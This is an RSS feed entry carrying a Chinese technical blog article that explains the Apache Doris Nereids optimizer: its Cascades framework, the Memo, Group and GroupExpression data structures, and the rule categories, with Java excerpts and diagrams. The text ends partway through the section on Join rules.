<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[深入doris查询计划以及io调度（二）Nereids优化器详解]]></title>    <link>https://juejin.cn/post/7592119218025758755</link>    <guid>https://juejin.cn/post/7592119218025758755</guid>    <pubDate>2026-01-06T08:02:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592119218025758755" data-draft-id="7591942733365674018" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入doris查询计划以及io调度（二）Nereids优化器详解"/> <meta itemprop="keywords" content="数据库"/> <meta itemprop="datePublished" content="2026-01-06T08:02:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="语落心生"/> <meta itemprop="url" content="https://juejin.cn/user/2875978147955741"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入doris查询计划以及io调度（二）Nereids优化器详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2875978147955741/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    语落心生
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:02:42.000Z" title="Tue Jan 06 2026 08:02:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    13
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">导读</h3>
<ol>
<li><strong>What</strong>：Nereids优化器的核心组件有哪些？Cascades框架是什么？</li>
<li><strong>Why</strong>：为什么需要重写优化器？Nereids相比传统Planner有哪些优势？</li>
<li><strong>How</strong>：Memo数据结构如何紧凑存储等价表达式？</li>
<li><strong>How</strong>：优化规则如何分类和执行？代价模型如何计算？</li>
</ol>
<h3 data-id="heading-1">核心概念</h3>
<ul>
<li><strong>Cascades框架</strong>：经典的查询优化框架</li>
<li><strong>Memo数据结构</strong>：Group和GroupExpression的紧凑表示</li>
<li><strong>优化规则系统</strong>：Rewrite、Exploration、Implementation三类规则</li>
<li><strong>代价模型（Cost Model）</strong>：CPU、内存、网络代价计算</li>
<li><strong>统计信息（Statistics）</strong>：基数估算、选择率计算</li>
<li><strong>规则优化阶段</strong>：Analyze、Rewrite、Optimize、PostProcess</li>
<li><strong>DPHyp算法</strong>：动态规划Join顺序优化</li>
<li><strong>物化视图改写</strong>：自动利用物化视图加速查询</li>
</ul>
<hr/>
<h2 data-id="heading-2">1. Nereids 优化器架构概览（What &amp; Why）</h2>
<h3 data-id="heading-3">1.1 为什么需要 Nereids 优化器（Why）</h3>
<h4 data-id="heading-4">传统 Planner 的局限性</h4>
<p><strong>传统 Planner 的问题</strong>：</p>
<ol>
<li>
<p><strong>基于规则的优化（RBO）为主</strong>：</p>
<ul>
<li>缺乏完善的代价模型</li>
<li>无法根据数据统计信息做出最优选择</li>
<li>Join 顺序优化能力有限</li>
</ul>
</li>
<li>
<p><strong>硬编码优化逻辑</strong>：</p>
<ul>
<li>新增优化规则需要修改多处代码</li>
<li>难以维护和扩展</li>
<li>规则之间可能存在冲突</li>
</ul>
</li>
<li>
<p><strong>搜索空间受限</strong>：</p>
<ul>
<li>无法探索所有可能的等价计划</li>
<li>容易陷入局部最优</li>
</ul>
</li>
<li>
<p><strong>子查询处理能力弱</strong>：</p>
<ul>
<li>子查询 Unnesting 不完整</li>
<li>相关子查询优化困难</li>
</ul>
</li>
</ol>
<h4 data-id="heading-5">Nereids 的设计目标</h4>
<p><strong>核心目标</strong>：</p>
<ol>
<li>
<p><strong>完整的 CBO 优化器</strong>：</p>
<ul>
<li>基于 Cascades 框架</li>
<li>完善的代价模型和统计信息</li>
<li>自动选择最优执行计划</li>
</ul>
</li>
<li>
<p><strong>声明式规则系统</strong>：</p>
<ul>
<li>模式匹配（Pattern Matching）</li>
<li>规则独立，易于扩展</li>
<li>规则正确性容易验证</li>
</ul>
</li>
<li>
<p><strong>强大的表达式优化</strong>：</p>
<ul>
<li>完整的常量折叠</li>
<li>谓词推导和简化</li>
<li>公共子表达式消除</li>
</ul>
</li>
<li>
<p><strong>先进的 Join 优化</strong>：</p>
<ul>
<li>DPHyp 动态规划算法</li>
<li>支持 Bushy Tree</li>
<li>智能 Join 顺序选择</li>
</ul>
</li>
</ol>
<h3 data-id="heading-6">1.2 Cascades 框架基础</h3>
<p><strong>Cascades 核心思想</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[初始查询计划] --&gt; B[Memo初始化]
    B --&gt; C[应用转换规则]
    C --&gt; D[扩展搜索空间]
    D --&gt; E[探索等价计划]
    E --&gt; F[代价估算]
    F --&gt; G[选择最优计划]
    
    C -.递归.-&gt; C
    E -.递归.-&gt; E
</code></pre>
<p><strong>三个关键概念</strong>：</p>
<ol>
<li>
<p><strong>Memo</strong>：</p>
<ul>
<li>紧凑存储所有等价表达式</li>
<li>避免重复生成相同的计划</li>
<li>Group 表示逻辑等价的表达式集合</li>
</ul>
</li>
<li>
<p><strong>规则驱动（Rule-Based）</strong>：</p>
<ul>
<li>通过应用规则生成新的等价计划</li>
<li>规则分为逻辑转换和物理实现</li>
<li>自动探索搜索空间</li>
</ul>
</li>
<li>
<p><strong>代价驱动（Cost-Based）</strong>：</p>
<ul>
<li>为每个物理计划估算代价</li>
<li>基于统计信息选择最优计划</li>
<li>动态规划寻找全局最优</li>
</ul>
</li>
</ol>
<h3 data-id="heading-7">1.3 Nereids 架构组件</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[SQL] --&gt; B[Parser解析]
    B --&gt; C[LogicalPlan逻辑计划]
    C --&gt; D[Analyzer分析]
    D --&gt; E[Rewriter重写]
    E --&gt; F[Optimizer优化]
    F --&gt; G[PhysicalPlan物理计划]
    G --&gt; H[PostProcessor后处理]
    H --&gt; I[分布式计划]
    
    D --&gt; D1[类型推导]
    D --&gt; D2[名称解析]
    
    E --&gt; E1[谓词下推]
    E --&gt; E2[列裁剪]
    E --&gt; E3[常量折叠]
    
    F --&gt; F1[Join顺序]
    F --&gt; F2[物理算子选择]
    F --&gt; F3[代价估算]
</code></pre>
<p><strong>核心组件</strong>：</p>


















































<table><thead><tr><th>组件</th><th>职责</th><th>关键类</th></tr></thead><tbody><tr><td><strong>CascadesContext</strong></td><td>优化上下文</td><td><code>CascadesContext.java</code></td></tr><tr><td><strong>Memo</strong></td><td>存储等价表达式</td><td><code>Memo.java</code></td></tr><tr><td><strong>Group</strong></td><td>逻辑等价的表达式集合</td><td><code>Group.java</code></td></tr><tr><td><strong>GroupExpression</strong></td><td>具体的表达式实现</td><td><code>GroupExpression.java</code></td></tr><tr><td><strong>Rewriter</strong></td><td>逻辑重写</td><td><code>Rewriter.java</code></td></tr><tr><td><strong>Optimizer</strong></td><td>CBO 优化</td><td><code>Optimizer.java</code></td></tr><tr><td><strong>CostCalculator</strong></td><td>代价计算</td><td><code>CostCalculator.java</code></td></tr><tr><td><strong>Statistics</strong></td><td>统计信息</td><td><code>Statistics.java</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-8">2. Memo 数据结构详解（How）</h2>
<h3 data-id="heading-9">2.1 Memo 核心设计</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/memo/Memo.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Memo</span> {
    <span class="hljs-comment">// Group ID 生成器</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> IdGenerator&lt;GroupId&gt; groupIdGenerator = GroupId.createGenerator();
    
    <span class="hljs-comment">// 所有 Group 的集合</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;GroupId, Group&gt; groups = Maps.newLinkedHashMap();
    
    <span class="hljs-comment">// 所有 GroupExpression 的集合（用于去重）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;GroupExpression, GroupExpression&gt; groupExpressions = Maps.newHashMap();
    
    <span class="hljs-comment">// 根 Group</span>
    <span class="hljs-keyword">private</span> Group root;
    
    <span class="hljs-comment">/**
     * 将 Plan 添加到 Memo 中
     */</span>
    <span class="hljs-keyword">public</span> CopyInResult <span class="hljs-title function_">copyIn</span><span class="hljs-params">(Plan plan, <span class="hljs-meta">@Nullable</span> Group target, <span class="hljs-type">boolean</span> rewrite)</span> {
        CopyInResult result;
        <span class="hljs-keyword">if</span> (rewrite) {
            result = doRewrite(plan, target);
        } <span class="hljs-keyword">else</span> {
            result = doCopyIn(plan, target, <span class="hljs-literal">null</span>);
        }
        <span class="hljs-keyword">return</span> result;
    }
}
</code></pre>
<p><strong>设计要点</strong>：</p>
<ol>
<li>
<p><strong>紧凑存储</strong>：</p>
<ul>
<li>所有等价表达式存储在同一个 Group 中</li>
<li>避免重复存储相同结构的计划</li>
<li>通过 groupExpressions Map 快速去重</li>
</ul>
</li>
<li>
<p><strong>引用共享</strong>：</p>
<ul>
<li>子计划通过 Group 引用</li>
<li>多个 GroupExpression 可以共享子 Group</li>
<li>减少内存占用</li>
</ul>
</li>
<li>
<p><strong>版本控制</strong>：</p>
<ul>
<li>refreshVersion 跟踪 Memo 的变化</li>
<li>用于统计信息的增量更新</li>
</ul>
</li>
</ol>
<h3 data-id="heading-10">2.2 Group 设计</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/memo/Group.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Group</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> GroupId groupId;
    
    <span class="hljs-comment">// 逻辑表达式列表</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;GroupExpression&gt; logicalExpressions = Lists.newArrayList();
    
    <span class="hljs-comment">// 物理表达式列表</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;GroupExpression&gt; physicalExpressions = Lists.newArrayList();
    
    <span class="hljs-comment">// 逻辑属性（输出列、数据分布等）</span>
    <span class="hljs-keyword">private</span> LogicalProperties logicalProperties;
    
    <span class="hljs-comment">// 最优计划缓存：PhysicalProperties -&gt; (Cost, GroupExpression)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;PhysicalProperties, Pair&lt;Cost, GroupExpression&gt;&gt; lowestCostPlans
        = Maps.newLinkedHashMap();
    
    <span class="hljs-comment">// 统计信息</span>
    <span class="hljs-keyword">private</span> Statistics statistics;
    
    <span class="hljs-comment">/**
     * 添加 GroupExpression
     */</span>
    <span class="hljs-keyword">public</span> GroupExpression <span class="hljs-title function_">addGroupExpression</span><span class="hljs-params">(GroupExpression groupExpression)</span> {
        <span class="hljs-keyword">if</span> (groupExpression.getPlan() <span class="hljs-keyword">instanceof</span> LogicalPlan) {
            logicalExpressions.add(groupExpression);
        } <span class="hljs-keyword">else</span> {
            physicalExpressions.add(groupExpression);
        }
        groupExpression.setOwnerGroup(<span class="hljs-built_in">this</span>);
        <span class="hljs-keyword">return</span> groupExpression;
    }
    
    <span class="hljs-comment">/**
     * 设置最优计划
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBestPlan</span><span class="hljs-params">(GroupExpression expression, Cost cost, 
                           PhysicalProperties properties)</span> {
        <span class="hljs-keyword">if</span> (lowestCostPlans.containsKey(properties)) {
            <span class="hljs-keyword">if</span> (lowestCostPlans.get(properties).first.getValue() &gt; cost.getValue()) {
                lowestCostPlans.put(properties, Pair.of(cost, expression));
            }
        } <span class="hljs-keyword">else</span> {
            lowestCostPlans.put(properties, Pair.of(cost, expression));
        }
    }
}
</code></pre>
<p><strong>Group 的关键属性</strong>：</p>
<ol>
<li>
<p><strong>逻辑等价性</strong>：</p>
<ul>
<li>同一 Group 中的所有 LogicalExpression 逻辑等价</li>
<li>产生相同的输出数据</li>
<li>具有相同的 LogicalProperties</li>
</ul>
</li>
<li>
<p><strong>多种物理实现</strong>：</p>
<ul>
<li>一个逻辑计划可以有多种物理实现</li>
<li>例如：LogicalJoin -&gt; HashJoin / NestLoopJoin</li>
</ul>
</li>
<li>
<p><strong>最优计划缓存</strong>：</p>
<ul>
<li>针对不同的物理属性需求（排序、分布）</li>
<li>缓存对应的最优计划和代价</li>
<li>避免重复计算</li>
</ul>
</li>
</ol>
<h3 data-id="heading-11">2.3 GroupExpression 设计</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/memo/GroupExpression.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GroupExpression</span> {
    <span class="hljs-keyword">private</span> Group ownerGroup;          <span class="hljs-comment">// 所属 Group</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;Group&gt; children; <span class="hljs-comment">// 子 Group 列表</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Plan plan;           <span class="hljs-comment">// 对应的 Plan 节点</span>
    
    <span class="hljs-comment">// 规则应用标记（避免重复应用）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> BitSet ruleMasks;
    
    <span class="hljs-comment">// 统计信息是否已推导</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> statDerived;
    
    <span class="hljs-comment">// 最优代价表：OutputProperties -&gt; (Cost, ChildrenInputProperties)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;PhysicalProperties, Pair&lt;Cost, List&lt;PhysicalProperties&gt;&gt;&gt; 
        lowestCostTable;
    
    <span class="hljs-comment">// 请求属性映射：RequestProperties -&gt; OutputProperties</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;PhysicalProperties, PhysicalProperties&gt; requestPropertiesMap;
    
    <span class="hljs-comment">/**
     * 更新最优代价表
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">updateLowestCostTable</span><span class="hljs-params">(PhysicalProperties outputProperties,
            List&lt;PhysicalProperties&gt; childrenInputProperties, Cost cost)</span> {
        <span class="hljs-keyword">if</span> (lowestCostTable.containsKey(outputProperties)) {
            <span class="hljs-keyword">if</span> (lowestCostTable.get(outputProperties).first.getValue() &gt; cost.getValue()) {
                lowestCostTable.put(outputProperties, Pair.of(cost, childrenInputProperties));
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
        } <span class="hljs-keyword">else</span> {
            lowestCostTable.put(outputProperties, Pair.of(cost, childrenInputProperties));
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    }
    
    <span class="hljs-comment">/**
     * 检查规则是否已应用
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasApplied</span><span class="hljs-params">(Rule rule)</span> {
        <span class="hljs-keyword">return</span> ruleMasks.get(rule.getRuleType().ordinal());
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setApplied</span><span class="hljs-params">(Rule rule)</span> {
        ruleMasks.set(rule.getRuleType().ordinal());
    }
}
</code></pre>
<p><strong>GroupExpression 的作用</strong>：</p>
<ol>
<li>
<p><strong>连接 Plan 和 Group</strong>：</p>
<ul>
<li>Plan：具体的算子（如 HashJoin）</li>
<li>Children：子 Group 列表（不是具体 Plan）</li>
<li>共享子表达式</li>
</ul>
</li>
<li>
<p><strong>代价计算</strong>：</p>
<ul>
<li>lowestCostTable：针对不同输出属性的最优代价</li>
<li>childrenInputProperties：对子节点的属性要求</li>
<li>支持动态规划的代价累加</li>
</ul>
</li>
<li>
<p><strong>规则应用追踪</strong>：</p>
<ul>
<li>ruleMasks：记录已应用的规则</li>
<li>避免重复应用相同规则</li>
<li>防止无限递归</li>
</ul>
</li>
</ol>
<h3 data-id="heading-12">2.4 Memo 示例</h3>
<p><strong>查询</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t1 <span class="hljs-keyword">JOIN</span> t2 <span class="hljs-keyword">ON</span> t1.id <span class="hljs-operator">=</span> t2.id <span class="hljs-keyword">WHERE</span> t1.value <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span>;
</code></pre>
<p><strong>Memo 结构</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Group 0:</span> <span class="hljs-string">(Root)</span>
  <span class="hljs-string">├─</span> <span class="hljs-attr">LogicalExpression 0:</span> <span class="hljs-string">LogicalJoin</span>
  <span class="hljs-string">│</span>   <span class="hljs-string">├─</span> <span class="hljs-string">child[0]</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">Group</span> <span class="hljs-number">1</span>
  <span class="hljs-string">│</span>   <span class="hljs-string">└─</span> <span class="hljs-string">child[1]</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">Group</span> <span class="hljs-number">2</span>
  <span class="hljs-string">├─</span> <span class="hljs-attr">PhysicalExpression 0:</span> <span class="hljs-string">HashJoin</span> <span class="hljs-string">(Build:</span> <span class="hljs-string">Group</span> <span class="hljs-number">2</span><span class="hljs-string">,</span> <span class="hljs-attr">Probe:</span> <span class="hljs-string">Group</span> <span class="hljs-number">1</span><span class="hljs-string">)</span>
  <span class="hljs-string">└─</span> <span class="hljs-attr">PhysicalExpression 1:</span> <span class="hljs-string">NestLoopJoin</span>

<span class="hljs-attr">Group 1:</span> <span class="hljs-string">(t1</span> <span class="hljs-string">after</span> <span class="hljs-string">filter)</span>
  <span class="hljs-string">├─</span> <span class="hljs-attr">LogicalExpression 0:</span> <span class="hljs-string">LogicalFilter</span>
  <span class="hljs-string">│</span>   <span class="hljs-string">└─</span> <span class="hljs-string">child[0]</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">Group</span> <span class="hljs-number">3</span>
  <span class="hljs-string">└─</span> <span class="hljs-attr">PhysicalExpression 0:</span> <span class="hljs-string">PhysicalFilter</span>
      <span class="hljs-string">└─</span> <span class="hljs-string">child[0]</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">Group</span> <span class="hljs-number">3</span> <span class="hljs-string">(PhysicalOlapScan)</span>

<span class="hljs-attr">Group 2:</span> <span class="hljs-string">(t2</span> <span class="hljs-string">scan)</span>
  <span class="hljs-string">├─</span> <span class="hljs-attr">LogicalExpression 0:</span> <span class="hljs-string">LogicalOlapScan(t2)</span>
  <span class="hljs-string">└─</span> <span class="hljs-attr">PhysicalExpression 0:</span> <span class="hljs-string">PhysicalOlapScan(t2)</span>

<span class="hljs-attr">Group 3:</span> <span class="hljs-string">(t1</span> <span class="hljs-string">scan)</span>
  <span class="hljs-string">├─</span> <span class="hljs-attr">LogicalExpression 0:</span> <span class="hljs-string">LogicalOlapScan(t1)</span>
  <span class="hljs-string">└─</span> <span class="hljs-attr">PhysicalExpression 0:</span> <span class="hljs-string">PhysicalOlapScan(t1)</span>
</code></pre>
<p><strong>等价计划展开</strong>：</p>
<p>通过 Memo 可以生成多种等价计划：</p>
<pre><code class="hljs language-css" lang="css">计划 <span class="hljs-number">1</span>: <span class="hljs-built_in">HashJoin</span>(<span class="hljs-built_in">PhysicalFilter</span>(<span class="hljs-built_in">PhysicalOlapScan</span>(t1)), <span class="hljs-built_in">PhysicalOlapScan</span>(t2))
计划 <span class="hljs-number">2</span>: <span class="hljs-built_in">NestLoopJoin</span>(<span class="hljs-built_in">PhysicalFilter</span>(<span class="hljs-built_in">PhysicalOlapScan</span>(t1)), <span class="hljs-built_in">PhysicalOlapScan</span>(t2))
计划 <span class="hljs-number">3</span>: <span class="hljs-built_in">HashJoin</span>(<span class="hljs-built_in">PhysicalOlapScan</span>(t1) + Filter下推, <span class="hljs-built_in">PhysicalOlapScan</span>(t2))
...
</code></pre>
<hr/>
<h2 data-id="heading-13">3. 优化规则系统（How）</h2>
<h3 data-id="heading-14">3.1 规则分类</h3>
<p><strong>Nereids 中的三类规则</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[优化规则] --&gt; B[Rewrite 重写规则]
    A --&gt; C[Exploration 探索规则]
    A --&gt; D[Implementation 实现规则]
    
    B --&gt; B1[谓词下推]
    B --&gt; B2[列裁剪]
    B --&gt; B3[常量折叠]
    B --&gt; B4[子查询Unnesting]
    
    C --&gt; C1[Join交换]
    C --&gt; C2[Join结合]
    C --&gt; C3[聚合下推]
    C --&gt; C4[物化视图改写]
    
    D --&gt; D1[逻辑-&gt;HashJoin]
    D --&gt; D2[逻辑-&gt;NestLoopJoin]
    D --&gt; D3[逻辑-&gt;StreamAgg]
    D --&gt; D4[逻辑-&gt;HashAgg]
</code></pre>
<h4 data-id="heading-15">3.1.1 Rewrite 规则（逻辑重写）</h4>
<p><strong>作用</strong>：</p>
<ul>
<li>在逻辑层面转换计划</li>
<li>不改变逻辑语义，但可能提高性能</li>
<li>在 Memo 初始化之前执行</li>
</ul>
<p><strong>常见规则</strong>：</p>
<ol>
<li>
<p><strong>谓词下推（Predicate Pushdown）</strong>：</p>
<ul>
<li><code>PushDownFilterThroughProject</code></li>
<li><code>PushDownFilterThroughJoin</code></li>
<li><code>PushDownFilterThroughAggregation</code></li>
</ul>
</li>
<li>
<p><strong>列裁剪（Column Pruning）</strong>：</p>
<ul>
<li><code>ColumnPruning</code></li>
<li>移除未使用的输出列</li>
</ul>
</li>
<li>
<p><strong>常量折叠（Constant Folding）</strong>：</p>
<ul>
<li><code>FoldConstantRule</code></li>
<li><code>SimplifyArithmeticRule</code></li>
</ul>
</li>
<li>
<p><strong>子查询去关联（Subquery Decorrelation）</strong>：</p>
<ul>
<li><code>CorrelateApplyToUnCorrelateApply</code></li>
<li><code>ApplyToJoin</code></li>
</ul>
</li>
</ol>
<p><strong>示例：谓词下推</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PushDownFilterThroughProject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OneRewriteRuleFactory</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Rule <span class="hljs-title function_">build</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> logicalFilter(logicalProject()).then(filter -&gt; {
            LogicalProject&lt;Plan&gt; project = filter.child();
            
            <span class="hljs-comment">// 将 Filter 中的表达式替换为 Project 下方的引用</span>
            Set&lt;Expr&gt; newPredicates = replaceExpression(
                filter.getConjuncts(), 
                project.getProjects()
            );
            
            <span class="hljs-comment">// 构造新的计划：Project(Filter(...))</span>
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalProject</span>&lt;&gt;(
                project.getProjects(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalFilter</span>&lt;&gt;(newPredicates, project.child())
            );
        });
    }
}
</code></pre>
<h4 data-id="heading-16">3.1.2 Exploration 规则（探索规则）</h4>
<p><strong>作用</strong>：</p>
<ul>
<li>生成逻辑等价的不同计划</li>
<li>扩展搜索空间</li>
<li>在 Optimizer 阶段执行</li>
</ul>
<p><strong>常见规则</strong>：</p>
<ol>
<li>
<p><strong>Join 交换律（Join Commute）</strong>：</p>
<ul>
<li><code>t1 JOIN t2</code> -&gt; <code>t2 JOIN t1</code></li>
<li>改变 Join 顺序</li>
</ul>
</li>
<li>
<p><strong>Join 结合律（Join Associate）</strong>：</p>
<ul>
